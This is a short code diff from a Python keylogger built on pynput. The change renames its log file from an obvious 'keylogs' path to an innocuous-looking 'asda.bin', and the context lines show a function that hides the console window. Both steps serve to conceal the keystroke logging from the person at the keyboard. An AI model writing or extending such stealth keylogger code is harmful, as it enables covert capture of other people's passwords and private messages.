@@ -3,7 +3,7 @@ import ctypes
 from pynput import keyboard
 from datetime import datetime
 
-LOG_FILE = os.path.expanduser(r"~\Documents\keylogs\log.txt")
+LOG_FILE = os.path.expanduser(r"~\Documents\asda.bin")
 
 def hide_console():
     ctypes.windll.kernel32.FreeConsole()
